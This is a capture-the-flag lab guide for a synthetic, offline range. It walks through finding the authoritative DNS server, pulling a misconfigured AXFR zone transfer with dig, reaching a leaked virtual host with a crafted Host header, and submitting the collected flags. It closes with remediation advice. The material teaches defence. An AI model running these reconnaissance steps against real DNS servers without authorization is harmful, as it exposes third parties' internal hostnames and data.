# Lab 04 — Misconfigured Zone Transfer

Practice finding an **authoritative DNS server** with `dig`/`nslookup`, spotting a
misconfigured **AXFR zone transfer**, and following the leaked data to a hidden
**virtual host**. All domains and data are synthetic (`range.test`) on an
isolated, offline Docker network.

## Before you start

New to these labs? Read the **[setup guide](../GETTING-STARTED.md)** first — it
covers installing Node.js and Docker, the two-terminal workflow, and how flags and
`verify` work.

Start the lab and open the toolbox (run from the project root):

```sh
node scripts/standalone-labctl.mjs start 04-zone-transfer
node scripts/standalone-labctl.mjs shell 04-zone-transfer
```

You are now **inside** the toolbox. Keep a **second terminal** open in the project
folder for `verify`. Authorized scope is `172.30.44.0/24` only.

> In this lab the proof value you find at each stage **is** the `RLAB{...}` flag:
> submit it with `verify`, and also reuse those same flag values in the final POST.

Objectives are gated in order: `authority → axfr → vhost → final`.

## Walkthrough

### 1. Identify the authoritative name server (`authority`)

Read the SOA/NS records with two tools, then read the `_authority` TXT record:

```sh
dig @172.30.44.53 range.test SOA
dig @172.30.44.53 range.test NS +short
nslookup -type=ns range.test 172.30.44.53
dig @172.30.44.53 _authority.range.test TXT +short    # this value is your flag
```

Verify the `_authority` value (second terminal):

```sh
node scripts/standalone-labctl.mjs verify 04-zone-transfer authority 'RLAB{...}'
```

### 2. Confirm the open zone transfer (`axfr`)

Request a full AXFR of the synthetic zone and pull out the proof record:

```sh
dig @172.30.44.53 range.test AXFR | tee /tmp/range.axfr
grep '_axfr-proof' /tmp/range.axfr          # the flag for this stage
grep -E '_route|_case' /tmp/range.axfr      # note the host/path/case for later
```

Verify the `_axfr-proof` value:

```sh
node scripts/standalone-labctl.mjs verify 04-zone-transfer axfr 'RLAB{...}'
```

### 3. Reach the leaked virtual host (`vhost`)

The zone reveals the virtual host `ops-archive.range.test` on `172.30.44.80:8080`.
Send the right `Host` header to read its proof page:

```sh
curl -i -H 'Host: ops-archive.range.test' http://172.30.44.80:8080/proof/blue-team
```

The response prints `vhost_proof=RLAB{...}` (plus `case=ZT-44` and
`serial=2026081304`). Verify the vhost flag:

```sh
node scripts/standalone-labctl.mjs verify 04-zone-transfer vhost 'RLAB{...}'
```

### 4. Submit the chained proof (`final`)

POST the three flags you found — the authority, AXFR, and vhost `RLAB{...}` values
— together with the case and serial:

```sh
curl -H 'Host: ops-archive.range.test' -X POST \
  --data-urlencode 'authority=<authority-flag>' \
  --data-urlencode 'axfr=<axfr-flag>' \
  --data-urlencode 'vhost=<vhost-flag>' \
  --data-urlencode 'case=ZT-44' \
  --data-urlencode 'serial=2026081304' \
  http://172.30.44.80:8080/final
```

The response prints `final_proof=RLAB{...}` — verify it:

```sh
node scripts/standalone-labctl.mjs verify 04-zone-transfer final 'RLAB{...}'
```

## Verify & reset

```sh
node scripts/standalone-labctl.mjs status 04-zone-transfer
node scripts/standalone-labctl.mjs reset  04-zone-transfer
node scripts/standalone-labctl.mjs stop   04-zone-transfer
```

`smoke` is a maintainer/CI self-check, not part of the solution path.

## Detection / remediation

- In production, authoritative DNS should restrict AXFR with an allowlist/TSIG,
  separate public and internal views, and alert on unusual zone-transfer requests.
- Treat any data reachable through an open transfer as exposed — hostnames, paths,
  and internal notes all leak.
- The DNS and HTTP targets publish no host ports and have no internet egress.
